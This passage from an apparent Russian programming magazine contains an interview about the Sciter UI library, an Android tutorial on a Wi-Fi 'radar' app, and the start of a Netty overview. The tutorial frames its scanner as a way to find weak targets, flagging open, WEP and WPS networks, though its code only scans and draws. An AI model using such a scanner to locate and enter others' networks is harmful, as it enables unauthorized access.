и не про бизнес, а строго про кодинг. Так, чтобы, если это интервью открыл
человек, в нашу кухню не посвященный, его мозги бы вскипели и взорвались,
после чего он бы сразу закрыл журнал и пошел гуглить котиков :).

Немного о Sciter

У современных программистов нет проблем с выбором либы для создания GUI
своих приложений. К их услугам целый пул библиотек, начиная со старушки
MFC и заканчивая монстром Qt. Но есть одна разработка, которая стоит особ-
няком, — Sciter. Несмотря на то что она известна лишь в узких кругах, ее вы-
брали в качестве своей базы для пользовательских интерфейсов крупнейшие
AV-компании. Sciter позволяет создавать графический интерфейс с помощью
HTML и CSS. Дополнительным плюсом будет JS подобный язык программиро-
вания, который позволяет просто и быстро описать всю логику взаимодействия
с пользовательским интерфейсом. Создатель этой маленькой, но очень полез-
ной библиотеки — Андрей Федонюк, он же основатель и владелец компании
Terra Informatica Software.





Рис. 1. Avast, один из самых красочных антивирусов, использует Sciter для UI

Я: Здравствуйте, Андрей. Скажите, какие компании используют Sciter в своих
продуктах?

АФ: Добрый день. Вот лишь некоторые:
•  Symantec (Norton AntiVirus, Norton Internet Security, Norton Identity Safe
   и другие);
•   Alwil (Avast! Antivirus);
•  ESET (Nod32 Antivirus);
• Comodo (Comodo Antivirus, Comodo Internet Security Pro);
•  Bitdefender (Bitdefender Antivirus, Bitdefender Total Security);
•  Samsung;
•  Mail.ru.

Я: А с чего же все началось? Как пришла в голову идея создания подобной би-
блиотеки?

АФ: Началось все в году эдак 2002-м, когда моя жена попросила найти про-
грамму для «написания текста с фотографиями для веб-сайта». То есть требо-
вался некий простейший WYSIWYG-редактор. В тот момент ничего толкового
в стиле notepad.exe, но только для HTML мне найти не удалось. Поэтому я на-
чал вечерами работать над тем, что через девять месяцев стало BlockNote —
www.blocknote.net.
   Редактирующий движок BlockNote и был первой версией так называемой
h-smile core — HTML/CSS layout & rendering библиотеки, которая работает
и в современном Sciter.
   После запуска BlockNote на меня вышел Степан Пачиков, и мы начали де-
лать то, что сейчас известно как EverNote. Там изначально использовался
h-smile core editing engine в качестве редактора. Практика показала, что нали-
чие и использование встроенного HTML-движка очень сильно упрощает жизнь
в разработке fluid UI. Собственно так и родился HTMLayout (предшественник
Sciter. — Прим. ред.).
   Потом настало осознание того, что, кроме HTML/CSS, хорошо бы иметь
не менее удобные средства обработки UI событий в стиле on-click-here-hide-
element-there-and-show-this-info-other-where. В качестве кандидатов рассма-
тривались Ruby, Python, Lua, JavaScript. Были эксперименты с Java, я даже напи-
сал свою встраиваемую J-SMILE JavaVM. В конце концов пришел к написанию
«JavaScript with classes» — TIScript. HTMLayout + TIScript — и получилось то, что
сейчас известно как Sciter (Smart Client, next ITERatrion).

Я: Что конкретно привлекает ваших клиентов в Sciter?

АФ: Мотивы использования Sciter у каждого свои, но основные, как мне кажет-
ся, следующие.
   Во-первых, это «стилируемость». Стабильные продукты живут десятилети-
ями, но мода на UI меняется чаще. Поменять CSS и подправить скрипты зна-
чительно проще, чем переделывать весь «прибитый гвоздями» UI layer каждый
раз.
   Во-вторых, «Separation of concerns». Объекты UI имеют свой собственный
lifecycle, радикально отличный от объектов в слое бизнес-логики. У этих сло-
ев очень разные вычислительные модели: UI — это асинхронный reactive- код,
тогда как логика приложения — это последовательные алгоритмы и функции.
Garbage Collector в UI полезен и эффективен, но в логике он, как правило, из-
быточен, и более того — может сильно вредить, увеличивая время «залипания»
приложений во время циклов сборки мусора. Sciter предоставляет естествен-
ный механизм MVC.
   В-третьих, масштабируемость UI. Мы живем в эпоху перехода от старых
мониторов с разрешением в 96 точек на дюйм к Retina-мониторам. Количе-
ство пикселей, которые CPU должно нарисовать в видеопамяти, увеличива-
ется в квадратичной зависимости. UI rendering просто обязан использовать
GPU-ускорение, а это означает, что пора прощаться с GDI в Windows, который
есть в основном CPU drawing layer. Отказ от GDI влечет за собой отказ от child
окон в UI. То есть Windowless UI сейчас «наше всё» — по этой и многим дру-
гим причинам. И потом мы еще долго будем жить с ситуацией, когда к одному
и тому же компьютеру будут подключены мониторы с очень разным разреше-
нием. Мы должны приучить себя проектировать UI, в котором размеры заданы
не в GDI-пикселях, а в логических единицах — dip, миллиметрах и прочих. Так
делает и Sciter.
   В-четвертых, разделение труда. Команда, делающая бизнес-логику, и UI-ко-
манда должны обладать разными skillset, и это неизбежно. Да и географически
они могут находиться на разных континентах: от дизайн-студии в предместье
Парижа до технопарка в Бангалоре. Так уж получилось, что основные UI-дизай-
неры сейчас трудятся в Web Design. Sciter как раз и позволяет использовать
существующие Web stack решения и наработки в desktop UI.
   Ну и в заключение — есть большой класс мультиплатформенных приложе-
ний, которые должны выглядеть одинаково или похоже на разных платформах.
И в то же время каждая платформа имеет свои UI-стандарты, то есть требуется
механизм, позволяющий учитывать специфику. Типа этих вот условных блоков
в Sciter CSS:

@media Windows { ... }
@media OSX { ... }
@media GTK { ... }





Рис. 2. Архитектура Sciter в одной картинке

Я: Расскажите, пожалуйста, подробнее об архитектуре библиотеки.

АФ: Sciter изначально создавался как встраиваемый движок.
Требование «встраиваемости» означает:
•  расширяемость со стороны host приложения и то, что я называю practical API;
•  минимизация размера (на диске);
•  оптимизация потребления памяти;
•  скорость исполнения.

Минимизация  размера  binary  достигается  переиспользованием  кода,
например:
•  HTML-, XML-, SVG-парсеры — это один и тот же код;
•  HTML, CSS и Script используют одни и те же базовые примитивы и библио-
   теки (UNICODE-строки, коллекции и прочее).

Sciter по структуре кода близок к веб-браузеру, он содержит те же базовые ком-
поненты. Ведь на самом деле типичный веб-браузер — это не один, а несколь-
ко продуктов в одной упаковке. Так, скажем, в Google Chrome WebKit (HTML/
CSS) и V8 (JavaScript) — это отдельные продукты с разными core/runtime при-
митивами и библиотеками. Поэтому все вместе занимает значительно больше
места.
Расширяемость со стороны host-приложения означает:
•  host-приложение контролирует все «входы и выходы» UI, загрузка
   всех без исключения ресурсов, например, проходит через извещения
    (callbacks) в код host-приложения;
•  host-приложение может определить свой специальный набор типов
   элементов;
•  host-приложение может определить набор native-функций, которые будут
   доступны в скрипте;
•  UI и скрипт могут послать события в host-приложение об изменении
   состояния UI.

Я: Я работал со Sciter, и его производительность и нетребовательность к ре-
сурсам произвели на меня впечатление. Поделитесь секретом?

АФ: Задача оптимизации потребления памяти и скорости исполнения реша-
лась аккуратным программированием и анализом практических потребностей.
Например, я мог бы потратить время на суровую оптимизацию tiscript VM, сде-
лать JIT... но анализ UI-кода показал, что скрипт в UI — это по большому счету
средство соединения выхода одной native-функции со входом другой. То есть
вместо JIT я добавил встроенную имплементацию практически всех примити-
вов jQuery core, что позволило поднять скорость обработки UI-событий и пре-
доставить «из коробки» все необходимые средства.
   Соответственно, получился механизм, аналогичный AngularJS, скриптовая би-
блиотека +plus, обеспечивающая duplex data binding в скрипте, уложилась в 480
строк. Если же кому-то нужен ray-tracing в приложении (один из тестов JavaScript
virtual machines), то гораздо эффективнее его имплементировать в native code
или вообще использовать готовую библиотеку. И быстрее, и проще.


                                                                       Рис. 3. Вот
                                                                       так может
                                                                  выглядеть
                                                              приложение
                                                                 на Sciter в OS X





Я:  Как обстоят дела с конкурентами? Qt сейчас предлагает QSS, WebKit все
чаще используется для GUI в native-приложениях. Нет опасений, что они вытес-
нят Sciter в итоге?

АФ: У Sciter нет прямых конкурентов. Во всяком случае, другие встраиваемые
движки, предлагающие HTML/SVG/CSS/scripting «в одном флаконе», мне неиз-
вестны.
  Но конечно же, есть другие среды и библиотеки, которые позволяют делать
UI с той или иной степенью декларативности, например тот же Microsoft WPF,
но в .NET. Есть Qt со своим собственным QSS, где реализованы style sheets, ко-
торые потеряли слово cascading, что, скажем так, вдвое сократило полезность
стилей как механизма. Ну и отсутствие layout managers, задаваемых в стилях,
еще больше ограничивает применимость QSS.
   А вообще, сравнение Sciter engine и библиотек типа Qt не совсем кор-
ректное. Sciter API «выставляет наружу» всего три базовые сущности: элемент
DOM, его стили (CSS) и их интерфейсы в скрипте и native API. Весь UI строит-
ся из одинаковых DOM-элементов, которые уже стилируются и размещаются,
как требуется. Все встроенные input-элементы, например достаточно сложный
<input type=»date»>, — это коллекция тех самых атомарных DOM-элемен-
тов, которым приложение может задавать требуемые стили.
   Следствие всего трех базовых сущностей — компактность API: реально это
около 30 функций, которыми оперирует приложение и программист при встра-
ивании. Ну и соответственно, размер самого движка — 4 Мб на Windows.
   Естественно, Sciter не накладывает никаких ограничений на технологию са-
мого приложения. Оно может быть написано на C++, .NET, Objective-C или во-
обще на Delphi.
  По поводу WebKit, IE и других browser engines, которые иногда пытаются ис-
пользовать для HTML/CSS UI в desktop приложениях... Одна из основных задач
браузера — это обеспечение safe browsing experience, что накладывает просто
драконовские ограничения и резко ограничивает применимость в desktop UI.
  В качестве примера: в Sciter есть возможность объявить DOM-элемент
как detached — живущим в отдельном popup-окне. В browser такого сделать
нельзя в принципе — все окна или обязаны иметь URL документа, нарисован-
ный где-то, или быть внутри document canvas. Можно посмотреть на пример
приложения, использующего Sciter UI (рис. 3), там как раз такой popup DOM-э-
лемент с достаточно сложным markup и стилями. С WebKit или IE такого не сде-
лать в принципе.
   Ну и опять же существующие браузерные движки не гарантируют свой API
и вообще работу в embedded-режиме. Так, последние версии IE и WebKit за-
гружают свое содержимое не просто в отдельном окне, а вообще в отдельном
sandbox-процессе. Проблемы embedding таких конструкций, я думаю, объяс-
нять не надо.

Я: Какие дальнейшие планы по развитию Sciter? Есть ли куда расти?

АФ:  Sciter активно развивается по двум направлениям: функциональность,
на очереди, например, добавление в скрипт вкусностей из ES6, multi-column
и multi-page layout managers, и платформы, OpenGL backend для mobile и desktop
версий. А дальше «бой покажет»: Sciter — это customer driven development.
Кодинг
 Wi-Fi-детектор
 для Андроида





Сканируем радиоэфир в поисках
уязвимых точек доступа



ИНТРО
Мы живем в то самое замечательное время, когда космиче-
ские корабли бороздят просторы Большого театра, а каждая
домохозяйка в курсе последних трендов из области связи.
И даже если технические аспекты ей вряд ли интересны, то
как посмотреть котиков через Wi-Fi — она уж точно знает. Се-      Сергей Мельников
годня мы сотворим небольшое приложение, которое будет        mail@s-melnikov.net,                                                                                                        www.s-melnikov.net
полезно как увлеченным хакерам, занимающимся вардрай-
вингом, так и суровым любителям домашних животных.

Глоссарий

WAP (беспроводная точка доступа) — устройство для объединения компью-
теров в единую беспроводную сеть (обычно встраивается в роутер).

WPS (Wi-Fi Protected Setup) — стандарт полуавтоматического создания
беспроводной сети Wi-Fi (посредством нажатия кнопки)

WEP (Wired Equivalent Privacy) — алгоритм для обеспечения безопасности се-
тей Wi-Fi, основан на поточном шифровании RC4.

WPA (Wi-Fi Protected Access) — замена WPA c усовершенствованной схемой
шифрования RC4, обязательной аутентификацией с EAP.

WPA2 — замена WPA, усилено шифрование за счет ССMP и AES.

TKIP — протокол целостности временного ключа, в отличие от WEP использу-
ет более эффективный механизм управления ключами, но тот же самый алго-
ритм RC4 для шифрования данных.

CCMP — протокол блочного шифрования с кодом аутентичности, созданный
для замены TKIP.

AES — симметричный алгоритм блочного шифрования, принятый в качестве
стандарта шифрования правительством США.

EAP — расширяемый протокол аутентификации клиентов.



ТАКТИКО-ТЕХНИЧЕСКИЕ ХАРАКТЕРИСТИКИ
Темой нашего сегодняшнего изыскания будет приложение-детектор точек до-
ступа Wi-Fi, работающее в среде Android. Так как беспроводное оборудова-
ние, работающее на частоте 5 ГГц, не сильно распространено, ограничимся
диапазоном 2 ГГц. Кроме того, будем особо отмечать, во-первых - открытые
(незапароленные) точки доступа, во-вторых - имеющие устаревшее, а значит
слабое шифрование WEP, и в-третьих — точки, поддерживающие технологию
WPS. Об уязвимостях последней можно почитать в мартовском номере «Хаке-
ра» за 2012 год. Наконец, чтобы сделать задачу еще более интересной, нари-
суем в качестве GUI экран «настоящего» радара. Одним словом, смотри рис. 1.
В качестве среды разработки будем использовать Android Studio.

СЛУШАЕМ WI-FI-РАДИО
Использование технологии Wi-Fi предполагает наличие беспроводной точки
доступа (WAP) и не менее одного клиента. Каждая WAP должна иметь два иден-
тификатора — SSID и BSSID. Первый определяет имя точки и, соответственно,
сети (например, home, AKADO_1742, FREE_WIFI) и задается непосредствен-
но пользователем (последний тренд — именовать сеть иероглифами), второй,
как правило, содержит MAC-адрес точки.
  Каждые 100 мс WAP передает в эфир (широковещательно) свой идентифи-
катор SSID, с помощью которого клиент может узнать о существовании этой
точки доступа, используемых технологиях шифрования, ну и, конечно, под-
ключиться к ней. Если SSID не рассылается, такая точка доступа называется
скрытой и, чтобы подключиться к ней, клиент должен знать ее имя изначально.
Нужно сказать, что «скрытность» не служит сколько-нибудь значимой защитой
от злоумышленника, так как любой снифер трафика без труда покажет SSID.
   Для защиты от несанкционированного использования точки доступа при-
меняются разные виды аутентификации и шифрования: WEP, WPA, WPA2, TKIP/
AES и тому подобные. Самый первый из них, WEP, в настоящее время счита-
ется технически устаревшим и не рекомендован к использованию, хотя иногда
применяется для объединения в сеть совсем уж бородатых устройств. Взлом
WEP можно осуществить всего за несколько минут. WPA, пришедший на смену
WEP, сломать уже сложнее, хотя в 2008 году на конференции PacSec был пред-
ставлен способ компрометации ключа TKIP в WPA (за разъяснением терминов
отсылаю тебя к врезке) всего за четверть часа. Наконец, самой защищенной
(на сегодняшний день, разумеется) технологией является WPA2 с алгоритмом
шифрования AES.
  Может показаться, что в природе в принципе не должно существовать от-
крытых точек доступа, но это не так. Мы не будем касаться пользователей-экс-
тремалов, по разным причинам держащих беспарольные шлюзы во всемирную
паутину, а поговорим о... гостях.
   Когда приходят гости — это хорошо, когда приходят гости со смартфона-
ми — это тоже ничего так, а вот когда приходят гости со смартфонами и про-
сят Wi-Fi — это уже не круто. Давать им пароль от точки доступа как-то не хо-
чется, ведь это вторжение в личную сетевую жизнь, а отказывать — совсем уж
не комильфо. Специально для этих целей в некоторых маршрутизаторах (aka
роутерах) предусмотрено создание гостевой сети. Такая сеть существенно
ограничена в скорости доступа в интернет, но открыта для подключения всем
желающим. Единственным сдерживающим фактором служит белый (или чер-
ный ;)) список MAC-адресов смартфонов гостей, но собирать его — то еще за-
нятие, да и смена MAC не такая уж экзотика. В итоге, как ни прискорбно для од-
них, найти открытую сеть к радости других можно.





Рис. 2. Проект в Android Studio

WI-FI-КЛАСС
Для хранения информации обо всех найденных беспроводных точках доступа
напишем специальный класс:

public class WiFiAP {
    private String SSID;
    private String BSSID;
    private int Channel;
    private int Level;
    private int Security; // 0 — открытая сеть; 1 — WEP; 2 — WPA/WPA2
    private boolean WPS;  // WPS?
    public WiFiAP(String SSID, String BSSID, int Channel, int Level,
    int Security, boolean WPS) {
        this.SSID = SSID;
        this.BSSID = BSSID;
        this.Channel = Channel;
        this.Level = Level;
        this.Security = Security;
        this.WPS = WPS;
    }
    ...
    // Геттеры
}

где Channel — канал, на котором вещает точка, а Level — уровень сигнала (0 —
минимальный, 100 — максимальный). Кстати, допустимый частотный диапазон,
который определяет номер канала, в разных странах неодинаков. Например,
в России на сертифицированном оборудовании разрешены к использованию
тринадцать каналов, тогда как во Франции только четыре, в США — одиннад-
цать. Для преобразования частоты в номер канала воспользуемся функцией

private final static ArrayList<Integer> channelsFrequency =
     new ArrayList<Integer>(
        Arrays.asList(0, 2412, 2417, 2422, 2427, 2432, 2437, 2442,
                      2447, 2452, 2457, 2462, 2467, 2472, 2484));
public static int getChannelFromFrequency(int frequency) {
    return channelsFrequency.indexOf(Integer.valueOf(frequency));
}


WI-FI-ПРИЕМНИК
За работу с Wi-Fi в Android отвечает класс WifiManager, представляющий собой
системный сервис. Для доступа к нему необходимо использовать константу
Context.WIFI_SERVICE:

wifi = (WifiManager)getSystemService(Context.WIFI_SERVICE);

Для запуска процесса сканирования точек доступа используется метод wifi.
startScan(). Результаты сканирования будут транслироваться в асинхронном
режиме, поэтому для их получения и обработки нужно предусмотреть специ-
альный широковещательный приемник, обрабатывающий системное намере-
ние со стандартным действием SCAN_RESULTS_AVAILABLE_ACTION.

 ArrayList<WiFiAP> WiFiAPs = new ArrayList<WiFiAP>();
 ...
 BroadcastReceiver scanReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        List<ScanResult> results = wifi.getScanResults();
        if (results == null) return;
        WiFiAPs.clear();
        for (ScanResult result : results) {
         WiFiAP AP = new WiFiAP(result.SSID,
                                result.BSSID,
                                getChannelFromFrequency
                                    (result.frequency),
                                 WifiManager.calculateSignalLevel
                                    (result.level, maxSignalLevel),
                                getSecurity(result.capabilities),
                                getWPS(result.capabilities));
         WiFiAPs.add(AP);
        }
        ...
    }
};

В методе onReceive работает цикл, добавляющий в массив WiFiAPs все найден-
ные точки: параметры result.SSID и result.BSSID содержат уже готовые к употре-
блению строки, а вот с остальными нужно поработать. Так, result.frequency воз-
вращает частоту, на которой работает точка доступа, но мы, как радиолюбители
без стажа, привыкли работать с номером канала, поэтому вычисляем соответ-
ствующее значение — getChannelFromFrequency(result.frequency). Уро-
вень сигнала, содержащийся в result.level, определен как уровень затухания сиг-
нала (в децибелах) между клиентом и точкой доступа, и для нормализации этого
значения в классе WifiManager предусмотрен метод calculateSignalLevel,
принимающий в качестве второго параметра условный максимальный уровень
(в нашем случае — 100).
   Параметр result.capabilities содержит строку с поддерживаемыми методами
аутентификации и шифрования. В качестве примера она может иметь вид:

[WPA2-PSK-CCMP][ESS]
[WPA-PSK-TKIP][WPS]
[WEP]
[ESS]

Нас интересуют «хеш-теги»: WPA, WPA2, WEP, WPS — именно их пытаются об-
наружить методы getSecurity и getWPS и возвращают результаты в поля Security
и WPS соответственно.
   Для работы широковещательный приемник должен быть зарегистрирован
в системе. Существует два метода регистрации — в файле-манифесте про-
екта AndroidManifest.xml (этот вариант мы рассматривали несколько номеров
назад) и непосредственно в коде. Обычно приемники, влияющие на пользова-
тельский интерфейс конкретной активности, регистрируются внутри обработ-
чика onResume и отменяются во время срабатывания onPause:

@Override
public void onResume() {
    super.onResume();
    IntentFilter filter = new IntentFilter
        (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
    registerReceiver(scanReceiver, filter);
}
@Override
public void onPause() {
    unregisterReceiver(scanReceiver);
    super.onPause();
}

Итак, у нас есть список доступных (если повезет — очень доступных) беспрово-
дных точек доступа. Осталось только все это красиво упаковать, чем мы и зай-
мемся далее.


Бойся желаний своих

Для работы с модулем Wi-Fi необходимо запросить у пользователя разреше-
ние для чтения и изменения подключений:

<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
Кроме того, Android позволяет указать конкретную аппаратную особенность,
которая необходима для установки приложения. В нашем проекте уместно тре-
бовать наличие аппаратного модуля Wi-Fi:

<uses-feature android:name="android.hardware.wifi"/>
Если Wi-Fi-модуль на устройстве выключен, следующий код его оживит:

if (!wifi.isWifiEnabled())
 if (wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING)
  wifi.setWifiEnabled(true);
Тем не менее негласный кодекс хорошего программиста, создающего хоро-
шие программы, рекомендует предварительно спрашивать у пользователя
разрешения включить Wi-Fi.


ТВОРИМ GUI
Так как Google в ближайшее время вряд ли реализует компонент типа «радар»
в своем SDK, создадим его сами.
  В Андроиде все визуальные компоненты называются представлениями
(View). Чтобы соорудить новый элемент с чистого листа, необходимо наследо-
вать один из двух классов — либо View, либо SurfaceView. Их принципиальные
отличия приведены во врезке, а для нашей задачи вполне сгодится View.
   Класс View представляет собой пустую область экрана (канву) размером
100 × 100 пикселей. Для корректировки размера необходимо переопределить
метод onMesure, а для рисования на канве — onDraw. Внутри первого вычис-
ляется высота и ширина канвы, которая в нашем случае будет соответствовать
размеру экрана Android-устройства; внутри второго мы будем рисовать экран
нашего детектора и выводить точки доступа. Поскольку физический размер
экрана может быть любым, все геометрические параметры должны не при-
вязываться к абсолютным значениям, а вычисляться относительно какой-ли-
бо величины (например, радиуса радара). Каркас нашего класса представлен
в листинге (как всегда, полный исходник ищи на dvd.xakep.ru (dvd.xakep.ru)):

public class RadarView extends View {
    ...
    public RadarView(Context context) {
        super(context);
        setupView(); // Инициализируем объекты для рисования
    }
    @Override
    protected void onMeasure(int widthMeasureSpec,
    int heightMeasureSpec) {
        int measuredWidth = measure(widthMeasureSpec);
        int measuredHeight = measure(heightMeasureSpec);
        int d = Math.min(measuredWidth, measuredHeight);
        setMeasuredDimension(d, d);
    }
    @Override
    protected void onSizeChanged(int w, int h, int oldw, int oldh) {
        super.onSizeChanged(w, h, oldw, oldh);
        // Определяем шейдеры
        ...
    }
    @Override
    protected void onDraw(Canvas canvas) {
       // Рисуем
       ...
    }
}

Метод onMeasure вызывается в момент, когда родительское представление
(разметка активности) размещает внутри себя дочерний элемент (наш радар).
Параметры widthMeasureSpec и heightMeasureSpec определяют доступное
пространство, которое мы и займем, вызвав метод setMeasuredDimension.
Так как наше представление — идеальный круг, который должен вписаться
по ширине или высоте в экран (в зависимости от ориентации устройства), мы
с помощью Math.min вычисляем длину короткой грани и передаем ее в каче-
стве обоих параметров.
   Для рисования на канве используются кисти (Paint), позволяющие как за-
давать свойства графических примитивов (цвет, узор, толщину линий, размер
текста и прочее), так и указывать порядок отрисовки: шейдерный градиент,
цветовые фильтры, контурные эффекты и так далее. Метод onDraw вызывает-
ся всякий раз при обновлении экрана, поэтому в нем нежелательно создание
каких-либо объектов. Обычно все используемые объекты инициализируются
в конструкторе представления, в нашем случае — в методе setupView (дубли-
рующий код опущен):

protected void setupView() {
    // Сетка
    axisPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
    axisPaint.setColor(Color.argb(0x60, 0xFF, 0xFF, 0xFF));
    axisPaint.setStyle(Paint.Style.STROKE);
    axisPaint.setStrokeWidth(1);
    // Текст и маркеры
    textPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
    textPaint.setFakeBoldText(true);
    textPaint.setSubpixelText(true);
    textPaint.setTextAlign(Align.LEFT);
    ...
{

Флаг Paint.ANTI_ALIAS_FLAG включает режим сглаживания при рисовании,
а метод Color.argb, помимо цветовых составляющих (Red, Green, Blue), пер-
вым параметром позволяет указать степень прозрачности примитива. Возмож-
ности рисования на канве в Андроиде очень похожи на те, что предоставляет
подсистема GDI в Windows.
   Для придания реалистичности экрану нашего прибора будем использовать
радиальный градиентный шейдер. Основная идея — цвет вблизи центра ра-
дара должен быть более светлым, чем по краям. В то же время он должен зна-
чительно темнеть при приближении к внешнему кольцу. Градиентный шейдер
позволяет закрасить любой контур с помощью интерполированной цветовой
гаммы, задавать которую удобно в виде массива:

mainGradientColors = new int[4];
mainGradientColors[0] = Color.rgb(0xB8, 0xE0, 0xFF);
mainGradientColors[1] = Color.rgb(0xA1, 0xCF, 0xFF);
mainGradientColors[2] = Color.rgb(0x62, 0xAA, 0xFF);
mainGradientColors[3] = Color.BLACK;

Здесь мы указываем опорные цвета, между которыми нужно вычислить интер-
полятор — от центра радара к краям. Так как шейдер радиальный, необходимо
привязать распределение цветов по радиусу:

mainGradientPositions = new float[4];
mainGradientPositions[0] = 0.0f;
mainGradientPositions[1] = 0.2f;
mainGradientPositions[2] = 0.9f;
mainGradientPositions[3] = 1.0f;

где первый элемент массива соответствует
центру радара, а последний — внешнему
радиусу. Обрати внимание, все приведен-
ные свойства относительны и никак не за-
висят от физического размера экрана, поэ-
тому они вынесены в отделенный от onDraw
метод.
   Непосредственное создание шейдера
с указанными выше параметрами и привяз-
ку к экранным координатам в нашем слу-
чае удобнее всего производить в методе
onSizeChanged:

private RadialGradient mainGradient;     Рис. 3. Шейдер фона радара
...
int px = w / 2;
int py = h / 2;
center = new Point(px, py);
radius = Math.min(px, py) - 20; // Отступ от краев канвы
mainGradient = new RadialGradient(center.x, center.y, radius,
mainGradientColors, mainGradientPositions, Shader.TileMode.CLAMP);

Этот метод вызывается при любом изменении размеров представления. Объ-
ект сenter (центр радара) и переменная radius (внешний радиус) вычисляются
исходя из физического размера представления (то есть экрана) с помощью
переданной в onSizeChanged ширины (w) и высоты (h). Константа CLAMP опре-
деляет использование цвета по краям шейдера в случае, если область, задан-
ная кистью шейдера, меньше области заполнения.
   Теперь экран радара выглядит почти
реалистично — не хватает только эффекта
стеклянного купола над ним. Для его соз-
дания также подойдет радиальный гради-
ентный шейдер с той лишь разницей, что
вместо интерполяции по цвету используем
интерполяцию по степени прозрачности:

int glassColor = 0xF5;
glassGradientColors[0] = Color.argb
 (0, glassColor, glassColor, glassColor);
glassGradientColors[1] = Color.
 argb(50, glassColor, glassColor,
 glassColor);
                                                  Рис. 5. Шейдер стеклянного купола// и так далее

Полный листинг функции отрисовки onDraw приведен ниже:

@Override
protected void onDraw(Canvas canvas) {
    // Радиальный градиентный шейдер радара
    mainGradientPaint.setShader(mainGradient);
    canvas.drawOval(outerBox, mainGradientPaint);
    // Сетка
    canvas.drawCircle(center.x, center.y, radius*0.10f, axisPaint);
    canvas.drawCircle(center.x, center.y, radius*0.40f, axisPaint);
    canvas.drawCircle(center.x, center.y, radius*0.70f, axisPaint);
    canvas.save();
    canvas.rotate(15, center.x, center.y);
    for (int i = 0; i < 12; i++) {
        canvas.drawLine(center.x, center.y, center.x + radius *
            0.75f, center.y, axisPaint);
        canvas.rotate(30, center.x, center.y);
    }
    canvas.restore();
    // Данные
    drawData(canvas);
    // Шейдер стекла
    glassPaint.setShader(glassShader);
    canvas.drawOval(innerBox, glassPaint);
    // Внешняя окружность кольца
    circlePaint.setStrokeWidth(1);
    canvas.drawOval(outerBox, circlePaint);
    // Внутренняя окружность кольца
    circlePaint.setStrokeWidth(2);
    canvas.drawOval(innerBox, circlePaint);
}

Метод drawCircle рисует окружность на канве, а drawOval — эллипс, огра-
ниченный прямоугольником. Для привязки созданного ранее шейдера к кисти
рисования используется метод setShader. При нанесении сетки канва сна-
чала сохраняет систему координат — canvas.save, затем поворачивается
в цикле на 30 градусов относительно центра canvas.rotate(30, center.x,
center.y), образуя тем самым двенадцать секторов окружности. Каждый сек-
тор соответствует номеру канала работы точек доступа (канал №13 мы не рас-
сматриваем). Для возвращения к исходной системе координат вызывается ме-
тод canvas.restore.
  Метод drawData отображает маркеры точек доступа и их названия (SSID):
зеленым цветом — если точка открытая или используется WEP, синим — если
доступен WPS и белым во всех остальных случаях (но без отображения SSID).
При этом чем выше уровень сигнала точки, тем ближе она к центру радара и ярче.
Полный код ради экономии места (а также из-за его очевидности) я приводить
не буду — готовый исходник всегда ждет тебя с распростертыми объятиями.

View vs. SurfaceView

Для рисования в Андроиде предусмотрены два класса поверхностей — View
и SurfaceView. В большинстве приложений представления (например, нестан-
дартные компоненты) рисуются в главном графическом потоке. Но в этом же
потоке работают активности, приемники и даже сервисы. Вынести код отри-
совки в отдельный поток при использовании View принципиально невозможно,
так как любое изменение элементов графического интерфейса из фонового
потока в Андроиде явно запрещено.
   Выйти из сложившейся ситуации поможет применение объекта SurfaceView,
который поддерживает рисование из фоновых потоков, что делает SurfaceView
идеальным решением для ресурсоемких задач с быстрым обновлением экрана
(например, игр). Кроме того, SurfaceView предоставляет поверхность (Surface),
где можно отображать сложные сцены, используя весь арсенал пакета OpenGL
ES 1 и 2/3.



ВСТРАИВАЕМАЯ ТЕХНИКА
Сотворенный класс RadarView пока не привязан к какой-либо активности или
фрагменту. Исправим это, дополнив разметку единственной активности наше-
го приложения (main.xml):

<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="match_parent"
  android:layout_height="match_parent">
  <example.com.wifiradar.RadarView
     android:id="@+id/radarView"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
  />
</FrameLayout>

С точки зрения разметки класс RadarView представляет со-   DVD.XAKEP.RU
бой обычный компонент, но с тем отличием, что при задании
                                                                        На сайте тынеобходимо в обязательном порядке указывать полное наи-
                                                                       найдешь полный код
менование класса — example.com.wifiradar.RadarView.                                                                                приложения.
В поле android:id задается уникальный идентификатор, с по-
мощью которого можно получить ссылку на наш радар в коде
активности:

RadarView rv = (RadarView)this.findViewById
    (R.id.radarView);
rv.setData(WiFiAPs);

                                                         INFOТеперь после получения списка беспроводных точек доступа
достаточно лишь вызвать процедуру перерисовки радара:          Доработанное
                                                                          приложение Wi-Fi
                                                                                Radar доступноrv.invalidate();                                                                              для тестирования
                                                                                   в Google Play
                                                                                             (goo.gl/xUsGj8).
OUTRO
Все любят Wi-Fi! Нет, правда, все любят Wi-Fi! Это одна из немногих технологий
беспроводной связи, которая доступна абсолютно всем и проста в использо-
вании. Сегодня мы ненадолго заглянули за кулисы радиоэфира и даже создали
симпатичный компонент для Андроида. Надеюсь, ты знаешь, как правильно ис-
пользовать полученный скилл.
Кодинг





Умный дом
                      Обзор Netty — крутейшего
                      Java-фреймворкана Java


Фреймворк Netty появился относительно недавно, но
с каждым годом он только набирает популярность.
В 2011 году проект был удостоен награды Duke’s
Choice за инновации в сетевом программировании.
А уже сегодня его используют в своих разработках
такие гиганты, как Apple, Twitter, Facebook, Google и
Instagram. На базе Netty построены многие известные
проекты с открытым кодом: Infinispan, HornetQ, Vert.x,
Apache Cassandra и Elasticsearch. Попробуем разо-
браться, чем Netty так привлекает программистов со
всего мира и что он может предложить такого, чего
бы не было в JDK.





                                          gogaworm
                                                 gogaworm@tut.by


РАБОТА С СЕТЬЮ В JAVA
Изначально в Java использовались только блокирующие сокеты. Это значит, что
функция чтения из сокета ожидает до тех пор, пока не считается хотя бы один
байт или не произошел разрыв соединения. Функция записи в сокет ожида-
ет, пока все данные не будут переданы. Чтобы обработать несколько клиентов,
требуется выделять по потоку на клиента. Чем больше клиентов, тем больше
потоков. И все вроде бы хорошо, но переключение между потоками занимает
значительную часть процессорного времени, а потоки большую часть времени
просто простаивают. Так что переключаться приходится часто, нагрузка на си-
стему растет и чем больше клиентов подключается, тем медленнее они получа-
ют ответ сервера.


                                                              Сервер
                                                                      с блокирующими
                                                               сокетами





